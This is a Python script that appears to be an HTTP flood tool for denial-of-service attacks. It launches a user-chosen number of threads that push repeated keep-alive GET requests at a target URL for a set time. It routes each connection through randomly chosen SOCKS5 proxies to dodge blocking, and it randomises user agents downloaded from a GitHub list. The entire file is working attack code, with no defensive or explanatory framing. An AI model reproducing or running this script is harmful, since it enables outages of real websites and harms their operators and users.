import random
import threading
from urllib import parse
import requests
import socket
import socks
import sys
import time
import ssl
randIntn = random.randint
randElement = random.choice
accepts = [
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
    "Accept: text/html, application/xhtml+xml\r\nAccept-Encoding: gzip, deflate",
]
def readFile(filePath):
    return [line.strip() for line in open(file=filePath, mode="r").readlines()]
def urlParser(url):
    url = parse.urlsplit(url)
    host = url.netloc
    if url.scheme == "http":
        port = 80
    elif url.scheme == "https":
        port = 443
    path = url.path
    if path == "":
        path = "/"
    return (host, port, path)
def getUserAgents():
    response = requests.get("https://raw.githubusercontent.com/daxuaim/httpomu/main/ua.txt").text
    return [line.strip() for line in response.split('\n')]
def startAttack():
    proxyAddr = randElement(proxies).split(":")
    userAgent = randElement(userAgents)
    accept = randElement(accepts)
    headers = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Keep-Alive\r\n" + accept + "\r\nUser-Agent: " + userAgent + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
    while True: 
        conn = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
        conn.set_proxy(socks.SOCKS5, proxyAddr[0], int(proxyAddr[1]))
        conn.settimeout(3)
        try:
            conn.connect((host, port))
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = context.wrap_socket(conn, server_hostname=host)
        except:
            conn.close()
            proxyAddr = randElement(proxies).split(":")
            continue
        for i in range(100):
            try:
                writer = conn.makefile(mode="wb")
                writer.write(str(headers).encode())
                writer.flush()
            except:
                break
        conn.close()
if len(sys.argv[1:]) != 4:
    sys.exit()
host, port, path = urlParser(sys.argv[1])
threads = int(sys.argv[2])
floodTime = int(sys.argv[3])
proxyFile = sys.argv[4]
proxies = readFile(proxyFile)
userAgents = getUserAgents()
for i in range(threads):
    time.sleep(0.01)
    thread = threading.Thread(target=startAttack, daemon=True)
    thread.start()
    sys.stdout.flush()
while True:
    try:
        time.sleep(floodTime)
        break
    except KeyboardInterrupt:
        break